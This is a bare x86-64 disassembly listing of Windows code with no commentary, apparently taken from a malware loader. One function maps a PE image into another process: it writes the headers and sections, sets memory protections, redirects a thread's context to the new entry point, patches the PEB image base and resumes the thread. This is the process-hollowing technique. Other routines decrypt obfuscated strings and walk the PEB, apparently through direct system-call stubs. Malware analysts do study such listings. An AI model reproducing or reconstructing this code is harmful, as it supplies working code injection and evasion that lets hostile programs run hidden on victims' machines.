   140003c19:	80 3d 3a cc 50 00 00 	cmpb   $0x0,0x50cc3a(%rip)        # 0x14051085a
   140003c20:	0f 85 c0 fd ff ff    	jne    0x1400039e6
   140003c26:	e9 f7 fd ff ff       	jmp    0x140003a22
   140003c2b:	cc                   	int3
   140003c2c:	cc                   	int3
   140003c2d:	cc                   	int3
   140003c2e:	cc                   	int3
   140003c2f:	cc                   	int3
   140003c30:	66 c7 05 1f cc 50 00 	movw   $0x0,0x50cc1f(%rip)        # 0x140510858
   140003c37:	00 00 
   140003c39:	48 c7 05 0c cc 50 00 	movq   $0x0,0x50cc0c(%rip)        # 0x140510850
   140003c40:	00 00 00 00 
   140003c44:	c3                   	ret
   140003c45:	cc                   	int3
   140003c46:	cc                   	int3
   140003c47:	cc                   	int3
   140003c48:	cc                   	int3
   140003c49:	cc                   	int3
   140003c4a:	cc                   	int3
   140003c4b:	cc                   	int3
   140003c4c:	cc                   	int3
   140003c4d:	cc                   	int3
   140003c4e:	cc                   	int3
   140003c4f:	cc                   	int3
   140003c50:	66 c7 05 77 a1 50 00 	movw   $0x0,0x50a177(%rip)        # 0x14050ddd0
   140003c57:	00 00 
   140003c59:	48 c7 05 64 a1 50 00 	movq   $0x0,0x50a164(%rip)        # 0x14050ddc8
   140003c60:	00 00 00 00 
   140003c64:	c3                   	ret
   140003c65:	cc                   	int3
   140003c66:	cc                   	int3
   140003c67:	cc                   	int3
   140003c68:	cc                   	int3
   140003c69:	cc                   	int3
   140003c6a:	cc                   	int3
   140003c6b:	cc                   	int3
   140003c6c:	cc                   	int3
   140003c6d:	cc                   	int3
   140003c6e:	cc                   	int3
   140003c6f:	cc                   	int3
   140003c70:	56                   	push   %rsi
   140003c71:	57                   	push   %rdi
   140003c72:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140003c79:	48 89 d6             	mov    %rdx,%rsi
   140003c7c:	48 89 cf             	mov    %rcx,%rdi
   140003c7f:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140003c86:	00 00 
   140003c88:	e8 13 f3 00 00       	call   0x140012fa0
   140003c8d:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003c94:	01 c0                	add    %eax,%eax
   140003c96:	66 89 4c 24 42       	mov    %cx,0x42(%rsp)
   140003c9b:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   140003ca0:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140003ca5:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003ca8:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   140003cad:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   140003cb2:	c7 44 24 50 30 00 00 	movl   $0x30,0x50(%rsp)
   140003cb9:	00 
   140003cba:	c7 44 24 68 40 00 00 	movl   $0x40,0x68(%rsp)
   140003cc1:	00 
   140003cc2:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003cc7:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003ccc:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   140003cd1:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003cd8:	00 00 
   140003cda:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003cdf:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003ce4:	ba 06 00 03 00       	mov    $0x30006,%edx
   140003ce9:	e8 8d d8 ff ff       	call   0x14000157b
   140003cee:	85 c0                	test   %eax,%eax
   140003cf0:	78 42                	js     0x140003d34
   140003cf2:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003cf9:	00 00 
   140003cfb:	48 89 f1             	mov    %rsi,%rcx
   140003cfe:	e8 9d f2 00 00       	call   0x140012fa0
   140003d03:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003d0a:	01 c0                	add    %eax,%eax
   140003d0c:	66 89 4c 24 32       	mov    %cx,0x32(%rsp)
   140003d11:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   140003d16:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140003d1b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003d20:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003d25:	e8 8d d8 ff ff       	call   0x1400015b7
   140003d2a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003d2f:	e8 2a d7 ff ff       	call   0x14000145e
   140003d34:	90                   	nop
   140003d35:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140003d3c:	5f                   	pop    %rdi
   140003d3d:	5e                   	pop    %rsi
   140003d3e:	c3                   	ret
   140003d3f:	cc                   	int3
   140003d40:	41 57                	push   %r15
   140003d42:	41 56                	push   %r14
   140003d44:	41 55                	push   %r13
   140003d46:	41 54                	push   %r12
   140003d48:	56                   	push   %rsi
   140003d49:	57                   	push   %rdi
   140003d4a:	55                   	push   %rbp
   140003d4b:	53                   	push   %rbx
   140003d4c:	48 81 ec 48 05 00 00 	sub    $0x548,%rsp
   140003d53:	4c 89 ce             	mov    %r9,%rsi
   140003d56:	48 89 d0             	mov    %rdx,%rax
   140003d59:	48 89 ca             	mov    %rcx,%rdx
   140003d5c:	4c 8b 8c 24 b0 05 00 	mov    0x5b0(%rsp),%r9
   140003d63:	00 
   140003d64:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140003d69:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140003d70:	00 
   140003d71:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003d76:	49 89 c0             	mov    %rax,%r8
   140003d79:	e8 12 e9 ff ff       	call   0x140002690
   140003d7e:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003d83:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140003d87:	0f 84 07 02 00 00    	je     0x140003f94
   140003d8d:	4c 63 7e 3c          	movslq 0x3c(%rsi),%r15
   140003d91:	4a 8b 44 3e 30       	mov    0x30(%rsi,%r15,1),%rax
   140003d96:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003d9b:	42 8b 44 3e 50       	mov    0x50(%rsi,%r15,1),%eax
   140003da0:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003da5:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003dac:	00 
   140003dad:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140003db4:	00 
   140003db5:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140003dba:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003dbf:	45 31 c0             	xor    %r8d,%r8d
   140003dc2:	e8 e2 d6 ff ff       	call   0x1400014a9
   140003dc7:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003dcc:	85 c0                	test   %eax,%eax
   140003dce:	0f 88 b9 01 00 00    	js     0x140003f8d
   140003dd4:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140003dd9:	46 8b 4c 3e 54       	mov    0x54(%rsi,%r15,1),%r9d
   140003dde:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003de5:	00 00 
   140003de7:	49 89 f0             	mov    %rsi,%r8
   140003dea:	e8 c9 d6 ff ff       	call   0x1400014b8
   140003def:	66 42 83 7c 3e 06 00 	cmpw   $0x0,0x6(%rsi,%r15,1)
   140003df6:	0f 84 eb 00 00 00    	je     0x140003ee7
   140003dfc:	48 b8 df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rax
   140003e03:	49 01 7d 
   140003e06:	4d 8d 2c 37          	lea    (%r15,%rsi,1),%r13
   140003e0a:	49 81 c5 10 01 00 00 	add    $0x110,%r13
   140003e11:	31 ed                	xor    %ebp,%ebp
   140003e13:	48 8d 78 02          	lea    0x2(%rax),%rdi
   140003e17:	48 8d 58 1e          	lea    0x1e(%rax),%rbx
   140003e1b:	4c 8d 60 3e          	lea    0x3e(%rax),%r12
   140003e1f:	eb 23                	jmp    0x140003e44
   140003e21:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003e28:	0f 1f 84 00 00 00 00 
   140003e2f:	00 
   140003e30:	ff c5                	inc    %ebp
   140003e32:	42 0f b7 44 3e 06    	movzwl 0x6(%rsi,%r15,1),%eax
   140003e38:	49 83 c5 28          	add    $0x28,%r13
   140003e3c:	39 c5                	cmp    %eax,%ebp
   140003e3e:	0f 83 a3 00 00 00    	jae    0x140003ee7
   140003e44:	41 8b 45 1c          	mov    0x1c(%r13),%eax
   140003e48:	85 c0                	test   %eax,%eax
   140003e4a:	48 89 f9             	mov    %rdi,%rcx
   140003e4d:	48 ba df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rdx
   140003e54:	49 01 7d 
   140003e57:	48 0f 49 ca          	cmovns %rdx,%rcx
   140003e5b:	4d 89 e6             	mov    %r12,%r14
   140003e5e:	4c 0f 49 f3          	cmovns %rbx,%r14
   140003e62:	a9 00 00 00 20       	test   $0x20000000,%eax
   140003e67:	4c 0f 44 f1          	cmove  %rcx,%r14
   140003e6b:	48 b8 23 94 fa 54 50 	movabs $0x82feb65054fa9423,%rax
   140003e72:	b6 fe 82 
   140003e75:	49 01 c6             	add    %rax,%r14
   140003e78:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003e7d:	41 8b 55 04          	mov    0x4(%r13),%edx
   140003e81:	45 8b 4d 08          	mov    0x8(%r13),%r9d
   140003e85:	48 03 54 24 38       	add    0x38(%rsp),%rdx
   140003e8a:	45 8b 45 0c          	mov    0xc(%r13),%r8d
   140003e8e:	49 01 f0             	add    %rsi,%r8
   140003e91:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003e98:	00 00 
   140003e9a:	e8 19 d6 ff ff       	call   0x1400014b8
   140003e9f:	44 89 f0             	mov    %r14d,%eax
   140003ea2:	83 e0 fe             	and    $0xfffffffe,%eax
   140003ea5:	83 f8 04             	cmp    $0x4,%eax
   140003ea8:	74 86                	je     0x140003e30
   140003eaa:	41 8b 45 04          	mov    0x4(%r13),%eax
   140003eae:	48 03 44 24 38       	add    0x38(%rsp),%rax
   140003eb3:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003eb8:	41 8b 45 00          	mov    0x0(%r13),%eax
   140003ebc:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003ec1:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003ec6:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   140003ecb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003ed0:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003ed5:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140003eda:	45 89 f1             	mov    %r14d,%r9d
   140003edd:	e8 f3 d6 ff ff       	call   0x1400015d5
   140003ee2:	e9 49 ff ff ff       	jmp    0x140003e30
   140003ee7:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   140003eec:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140003ef2:	48 89 f9             	mov    %rdi,%rcx
   140003ef5:	31 d2                	xor    %edx,%edx
   140003ef7:	e8 94 f1 00 00       	call   0x140013090
   140003efc:	c7 84 24 a0 00 00 00 	movl   $0x100002,0xa0(%rsp)
   140003f03:	02 00 10 00 
   140003f07:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003f0c:	48 89 fa             	mov    %rdi,%rdx
   140003f0f:	e8 77 d5 ff ff       	call   0x14000148b
   140003f14:	85 c0                	test   %eax,%eax
   140003f16:	78 70                	js     0x140003f88
   140003f18:	42 8b 44 3e 28       	mov    0x28(%rsi,%r15,1),%eax
   140003f1d:	48 03 44 24 38       	add    0x38(%rsp),%rax
   140003f22:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   140003f29:	00 
   140003f2a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003f2f:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003f34:	e8 61 d5 ff ff       	call   0x14000149a
   140003f39:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003f3e:	85 c0                	test   %eax,%eax
   140003f40:	78 4b                	js     0x140003f8d
   140003f42:	48 8b 94 24 f8 00 00 	mov    0xf8(%rsp),%rdx
   140003f49:	00 
   140003f4a:	48 83 c2 10          	add    $0x10,%rdx
   140003f4e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003f55:	00 00 
   140003f57:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003f5c:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140003f62:	e8 51 d5 ff ff       	call   0x1400014b8
   140003f67:	85 c0                	test   %eax,%eax
   140003f69:	78 1d                	js     0x140003f88
   140003f6b:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003f70:	31 d2                	xor    %edx,%edx
   140003f72:	e8 05 d5 ff ff       	call   0x14000147c
   140003f77:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003f7c:	e8 dd d4 ff ff       	call   0x14000145e
   140003f81:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140003f86:	eb 13                	jmp    0x140003f9b
   140003f88:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003f8d:	31 d2                	xor    %edx,%edx
   140003f8f:	e8 32 d6 ff ff       	call   0x1400015c6
   140003f94:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003f9b:	48 81 c4 48 05 00 00 	add    $0x548,%rsp
   140003fa2:	5b                   	pop    %rbx
   140003fa3:	5d                   	pop    %rbp
   140003fa4:	5f                   	pop    %rdi
   140003fa5:	5e                   	pop    %rsi
   140003fa6:	41 5c                	pop    %r12
   140003fa8:	41 5d                	pop    %r13
   140003faa:	41 5e                	pop    %r14
   140003fac:	41 5f                	pop    %r15
   140003fae:	c3                   	ret
   140003faf:	cc                   	int3
   140003fb0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003fb3:	0f 29 05 26 9e 50 00 	movaps %xmm0,0x509e26(%rip)        # 0x14050dde0
   140003fba:	c3                   	ret
   140003fbb:	cc                   	int3
   140003fbc:	cc                   	int3
   140003fbd:	cc                   	int3
   140003fbe:	cc                   	int3
   140003fbf:	cc                   	int3
   140003fc0:	55                   	push   %rbp
   140003fc1:	41 57                	push   %r15
   140003fc3:	41 56                	push   %r14
   140003fc5:	41 55                	push   %r13
   140003fc7:	41 54                	push   %r12
   140003fc9:	56                   	push   %rsi
   140003fca:	57                   	push   %rdi
   140003fcb:	53                   	push   %rbx
   140003fcc:	b8 98 1a 00 00       	mov    $0x1a98,%eax
   140003fd1:	e8 8a e6 ff ff       	call   0x140002660
   140003fd6:	48 29 c4             	sub    %rax,%rsp
   140003fd9:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140003fe0:	00 
   140003fe1:	66 44 0f 7f bd 00 1a 	movdqa %xmm15,0x1a00(%rbp)
   140003fe8:	00 00 
   140003fea:	66 44 0f 7f b5 f0 19 	movdqa %xmm14,0x19f0(%rbp)
   140003ff1:	00 00 
   140003ff3:	66 44 0f 7f ad e0 19 	movdqa %xmm13,0x19e0(%rbp)
   140003ffa:	00 00 
   140003ffc:	66 44 0f 7f a5 d0 19 	movdqa %xmm12,0x19d0(%rbp)
   140004003:	00 00 
   140004005:	66 44 0f 7f 9d c0 19 	movdqa %xmm11,0x19c0(%rbp)
   14000400c:	00 00 
   14000400e:	66 44 0f 7f 95 b0 19 	movdqa %xmm10,0x19b0(%rbp)
   140004015:	00 00 
   140004017:	66 44 0f 7f 8d a0 19 	movdqa %xmm9,0x19a0(%rbp)
   14000401e:	00 00 
   140004020:	66 44 0f 7f 85 90 19 	movdqa %xmm8,0x1990(%rbp)
   140004027:	00 00 
   140004029:	66 0f 7f bd 80 19 00 	movdqa %xmm7,0x1980(%rbp)
   140004030:	00 
   140004031:	0f 29 b5 70 19 00 00 	movaps %xmm6,0x1970(%rbp)
   140004038:	e8 83 d6 ff ff       	call   0x1400016c0
   14000403d:	80 3d ee 9c 50 00 00 	cmpb   $0x0,0x509cee(%rip)        # 0x14050dd32
   140004044:	0f 84 f6 65 00 00    	je     0x14000a640
   14000404a:	80 3d 15 9f 50 00 00 	cmpb   $0x0,0x509f15(%rip)        # 0x14050df66
   140004051:	0f 84 c9 00 00 00    	je     0x140004120
   140004057:	66 0f 6f 05 d1 05 01 	movdqa 0x105d1(%rip),%xmm0        # 0x140014630
   14000405e:	00 
   14000405f:	66 0f 6f 0d a9 9e 50 	movdqa 0x509ea9(%rip),%xmm1        # 0x14050df10
   140004066:	00 
   140004067:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000406b:	66 0f 6f 15 cd 05 01 	movdqa 0x105cd(%rip),%xmm2        # 0x140014640
   140004072:	00 
   140004073:	66 0f db ca          	pand   %xmm2,%xmm1
   140004077:	66 0f 7f 0d 91 9e 50 	movdqa %xmm1,0x509e91(%rip)        # 0x14050df10
   14000407e:	00 
   14000407f:	66 0f 6f 0d 99 9e 50 	movdqa 0x509e99(%rip),%xmm1        # 0x14050df20
   140004086:	00 
   140004087:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000408b:	66 0f db ca          	pand   %xmm2,%xmm1
   14000408f:	66 0f 7f 0d 89 9e 50 	movdqa %xmm1,0x509e89(%rip)        # 0x14050df20
   140004096:	00 
   140004097:	66 0f 6f 0d 91 9e 50 	movdqa 0x509e91(%rip),%xmm1        # 0x14050df30
   14000409e:	00 
   14000409f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400040a3:	66 0f db ca          	pand   %xmm2,%xmm1
   1400040a7:	66 0f 7f 0d 81 9e 50 	movdqa %xmm1,0x509e81(%rip)        # 0x14050df30
   1400040ae:	00 
   1400040af:	66 0f 6f 0d 89 9e 50 	movdqa 0x509e89(%rip),%xmm1        # 0x14050df40
   1400040b6:	00 
   1400040b7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400040bb:	66 0f db ca          	pand   %xmm2,%xmm1
   1400040bf:	66 0f 7f 0d 79 9e 50 	movdqa %xmm1,0x509e79(%rip)        # 0x14050df40
   1400040c6:	00 
   1400040c7:	66 0f fd 05 81 9e 50 	paddw  0x509e81(%rip),%xmm0        # 0x14050df50
   1400040ce:	00 
   1400040cf:	66 0f db c2          	pand   %xmm2,%xmm0
   1400040d3:	66 0f 7f 05 75 9e 50 	movdqa %xmm0,0x509e75(%rip)        # 0x14050df50
   1400040da:	00 
   1400040db:	b8 cd 00 00 00       	mov    $0xcd,%eax
   1400040e0:	8b 0d 7a 9e 50 00    	mov    0x509e7a(%rip),%ecx        # 0x14050df60
   1400040e6:	01 c1                	add    %eax,%ecx
   1400040e8:	0f b6 c9             	movzbl %cl,%ecx
   1400040eb:	66 89 0d 6e 9e 50 00 	mov    %cx,0x509e6e(%rip)        # 0x14050df60
   1400040f2:	0f b7 0d 69 9e 50 00 	movzwl 0x509e69(%rip),%ecx        # 0x14050df62
   1400040f9:	81 c1 cd 00 00 00    	add    $0xcd,%ecx
   1400040ff:	0f b6 c9             	movzbl %cl,%ecx
   140004102:	66 89 0d 59 9e 50 00 	mov    %cx,0x509e59(%rip)        # 0x14050df62
   140004109:	03 05 55 9e 50 00    	add    0x509e55(%rip),%eax        # 0x14050df64
   14000410f:	0f b6 c0             	movzbl %al,%eax
   140004112:	66 89 05 4b 9e 50 00 	mov    %ax,0x509e4b(%rip)        # 0x14050df64
   140004119:	c6 05 46 9e 50 00 00 	movb   $0x0,0x509e46(%rip)        # 0x14050df66
   140004120:	48 c7 85 c0 18 00 00 	movq   $0x0,0x18c0(%rbp)
   140004127:	00 00 00 00 
   14000412b:	48 8d 35 de 9d 50 00 	lea    0x509dde(%rip),%rsi        # 0x14050df10
   140004132:	48 89 f1             	mov    %rsi,%rcx
   140004135:	e8 66 ee 00 00       	call   0x140012fa0
   14000413a:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004141:	01 c0                	add    %eax,%eax
   140004143:	66 89 8d c2 18 00 00 	mov    %cx,0x18c2(%rbp)
   14000414a:	66 89 85 c0 18 00 00 	mov    %ax,0x18c0(%rbp)
   140004151:	48 89 b5 c8 18 00 00 	mov    %rsi,0x18c8(%rbp)
   140004158:	c7 85 90 18 00 00 30 	movl   $0x30,0x1890(%rbp)
   14000415f:	00 00 00 
   140004162:	48 c7 85 98 18 00 00 	movq   $0x0,0x1898(%rbp)
   140004169:	00 00 00 00 
   14000416d:	c7 85 a8 18 00 00 00 	movl   $0x0,0x18a8(%rbp)
   140004174:	00 00 00 
   140004177:	48 8d 85 c0 18 00 00 	lea    0x18c0(%rbp),%rax
   14000417e:	48 89 85 a0 18 00 00 	mov    %rax,0x18a0(%rbp)
   140004185:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004189:	f3 0f 7f 85 b0 18 00 	movdqu %xmm0,0x18b0(%rbp)
   140004190:	00 
   140004191:	48 8d 8d 88 18 00 00 	lea    0x1888(%rbp),%rcx
   140004198:	4c 8d 85 90 18 00 00 	lea    0x1890(%rbp),%r8
   14000419f:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   1400041a4:	41 b1 01             	mov    $0x1,%r9b
   1400041a7:	e8 93 d3 ff ff       	call   0x14000153f
   1400041ac:	85 c0                	test   %eax,%eax
   1400041ae:	0f 88 ce 73 00 00    	js     0x14000b582
   1400041b4:	48 c7 85 70 16 00 00 	movq   $0x0,0x1670(%rbp)
   1400041bb:	00 00 00 00 
   1400041bf:	4c 8d 85 70 16 00 00 	lea    0x1670(%rbp),%r8
   1400041c6:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400041cd:	ba 08 00 00 00       	mov    $0x8,%edx
   1400041d2:	e8 2c d3 ff ff       	call   0x140001503
   1400041d7:	c7 85 50 12 00 00 00 	movl   $0x0,0x1250(%rbp)
   1400041de:	00 00 00 
   1400041e1:	48 8b 8d 70 16 00 00 	mov    0x1670(%rbp),%rcx
   1400041e8:	48 85 c9             	test   %rcx,%rcx
   1400041eb:	74 40                	je     0x14000422d
   1400041ed:	48 8d 85 50 12 00 00 	lea    0x1250(%rbp),%rax
   1400041f4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400041f9:	4c 8d 85 20 0c 00 00 	lea    0xc20(%rbp),%r8
   140004200:	ba 14 00 00 00       	mov    $0x14,%edx
   140004205:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000420b:	e8 5c d3 ff ff       	call   0x14000156c
   140004210:	85 c0                	test   %eax,%eax
   140004212:	78 19                	js     0x14000422d
   140004214:	48 8b 8d 70 16 00 00 	mov    0x1670(%rbp),%rcx
   14000421b:	e8 3e d2 ff ff       	call   0x14000145e
   140004220:	83 bd 20 0c 00 00 00 	cmpl   $0x0,0xc20(%rbp)
   140004227:	41 0f 95 c5          	setne  %r13b
   14000422b:	eb 03                	jmp    0x140004230
   14000422d:	45 31 ed             	xor    %r13d,%r13d
   140004230:	b9 9f af 7c 2b       	mov    $0x2b7caf9f,%ecx
   140004235:	e8 f6 e7 00 00       	call   0x140012a30
   14000423a:	89 c0                	mov    %eax,%eax
   14000423c:	65 48 8b 30          	mov    %gs:(%rax),%rsi
   140004240:	48 8b 46 20          	mov    0x20(%rsi),%rax
   140004244:	48 8b 80 80 00 00 00 	mov    0x80(%rax),%rax
   14000424b:	48 89 85 f8 18 00 00 	mov    %rax,0x18f8(%rbp)
   140004252:	48 8d bd 20 0c 00 00 	lea    0xc20(%rbp),%rdi
   140004259:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000425f:	48 89 f9             	mov    %rdi,%rcx
   140004262:	31 d2                	xor    %edx,%edx
   140004264:	e8 27 ee 00 00       	call   0x140013090
   140004269:	48 8b 46 20          	mov    0x20(%rsi),%rax
   14000426d:	48 8b 50 68          	mov    0x68(%rax),%rdx
   140004271:	48 89 f9             	mov    %rdi,%rcx
   140004274:	e8 07 ed 00 00       	call   0x140012f80
   140004279:	48 8d 8d 50 12 00 00 	lea    0x1250(%rbp),%rcx
   140004280:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004286:	31 d2                	xor    %edx,%edx
   140004288:	e8 03 ee 00 00       	call   0x140013090
   14000428d:	80 3d 9f 9a 50 00 00 	cmpb   $0x0,0x509a9f(%rip)        # 0x14050dd33
   140004294:	0f 84 2b 64 00 00    	je     0x14000a6c5
   14000429a:	80 3d e7 9c 50 00 00 	cmpb   $0x0,0x509ce7(%rip)        # 0x14050df88
   1400042a1:	74 47                	je     0x1400042ea
   1400042a3:	66 0f 6f 05 c5 9c 50 	movdqa 0x509cc5(%rip),%xmm0        # 0x14050df70
   1400042aa:	00 
   1400042ab:	66 0f fd 05 ad 03 01 	paddw  0x103ad(%rip),%xmm0        # 0x140014660
   1400042b2:	00 
   1400042b3:	66 0f db 05 85 03 01 	pand   0x10385(%rip),%xmm0        # 0x140014640
   1400042ba:	00 
   1400042bb:	66 0f 7f 05 ad 9c 50 	movdqa %xmm0,0x509cad(%rip)        # 0x14050df70
   1400042c2:	00 
   1400042c3:	f3 0f 7e 05 b5 9c 50 	movq   0x509cb5(%rip),%xmm0        # 0x14050df80
   1400042ca:	00 
   1400042cb:	66 0f fd 05 9d 03 01 	paddw  0x1039d(%rip),%xmm0        # 0x140014670
   1400042d2:	00 
   1400042d3:	66 0f db 05 a5 03 01 	pand   0x103a5(%rip),%xmm0        # 0x140014680
   1400042da:	00 
   1400042db:	66 0f d6 05 9d 9c 50 	movq   %xmm0,0x509c9d(%rip)        # 0x14050df80
   1400042e2:	00 
   1400042e3:	c6 05 9e 9c 50 00 00 	movb   $0x0,0x509c9e(%rip)        # 0x14050df88
   1400042ea:	48 8d 0d 7f 9c 50 00 	lea    0x509c7f(%rip),%rcx        # 0x14050df70
   1400042f1:	e8 aa ec 00 00       	call   0x140012fa0
   1400042f6:	48 8b b5 f8 18 00 00 	mov    0x18f8(%rbp),%rsi
   1400042fd:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140004301:	74 4b                	je     0x14000434e
   140004303:	49 89 c6             	mov    %rax,%r14
   140004306:	4c 8d 3d 63 9c 50 00 	lea    0x509c63(%rip),%r15        # 0x14050df70
   14000430d:	31 db                	xor    %ebx,%ebx
   14000430f:	49 89 f4             	mov    %rsi,%r12
   140004312:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004319:	1f 84 00 00 00 00 00 
   140004320:	4c 89 e1             	mov    %r12,%rcx
   140004323:	4c 89 fa             	mov    %r15,%rdx
   140004326:	4d 89 f0             	mov    %r14,%r8
   140004329:	e8 12 ed 00 00       	call   0x140013040
   14000432e:	85 c0                	test   %eax,%eax
   140004330:	0f 84 a6 03 00 00    	je     0x1400046dc
   140004336:	4c 89 e1             	mov    %r12,%rcx
   140004339:	e8 62 ec 00 00       	call   0x140012fa0
   14000433e:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   140004345:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   14000434a:	75 d4                	jne    0x140004320
   14000434c:	eb 02                	jmp    0x140004350
   14000434e:	31 db                	xor    %ebx,%ebx
   140004350:	80 3d dd 99 50 00 00 	cmpb   $0x0,0x5099dd(%rip)        # 0x14050dd34
   140004357:	0f 84 90 03 00 00    	je     0x1400046ed
   14000435d:	80 3d 40 9c 50 00 00 	cmpb   $0x0,0x509c40(%rip)        # 0x14050dfa4
   140004364:	74 47                	je     0x1400043ad
   140004366:	66 0f 6f 05 22 9c 50 	movdqa 0x509c22(%rip),%xmm0        # 0x14050df90
   14000436d:	00 
   14000436e:	66 0f fd 05 ea 02 01 	paddw  0x102ea(%rip),%xmm0        # 0x140014660
   140004375:	00 
   140004376:	66 0f db 05 c2 02 01 	pand   0x102c2(%rip),%xmm0        # 0x140014640
   14000437d:	00 
   14000437e:	66 0f 7f 05 0a 9c 50 	movdqa %xmm0,0x509c0a(%rip)        # 0x14050df90
   140004385:	00 
   140004386:	66 0f 6f 05 12 9c 50 	movdqa 0x509c12(%rip),%xmm0        # 0x14050dfa0
   14000438d:	00 
   14000438e:	66 0f fd 05 0a 03 01 	paddw  0x1030a(%rip),%xmm0        # 0x1400146a0
   140004395:	00 
   140004396:	66 0f db 05 12 03 01 	pand   0x10312(%rip),%xmm0        # 0x1400146b0
   14000439d:	00 
   14000439e:	66 0f 7e 05 fa 9b 50 	movd   %xmm0,0x509bfa(%rip)        # 0x14050dfa0
   1400043a5:	00 
   1400043a6:	c6 05 f7 9b 50 00 00 	movb   $0x0,0x509bf7(%rip)        # 0x14050dfa4
   1400043ad:	4c 8d b5 50 12 00 00 	lea    0x1250(%rbp),%r14
   1400043b4:	4c 89 f1             	mov    %r14,%rcx
   1400043b7:	48 89 da             	mov    %rbx,%rdx
   1400043ba:	e8 d1 eb 00 00       	call   0x140012f90
   1400043bf:	48 8d 15 ca 9b 50 00 	lea    0x509bca(%rip),%rdx        # 0x14050df90
   1400043c6:	4c 89 f1             	mov    %r14,%rcx
   1400043c9:	e8 b2 eb 00 00       	call   0x140012f80
   1400043ce:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400043d2:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400043d8:	31 d2                	xor    %edx,%edx
   1400043da:	e8 b1 ec 00 00       	call   0x140013090
   1400043df:	80 3d 4f 99 50 00 00 	cmpb   $0x0,0x50994f(%rip)        # 0x14050dd35
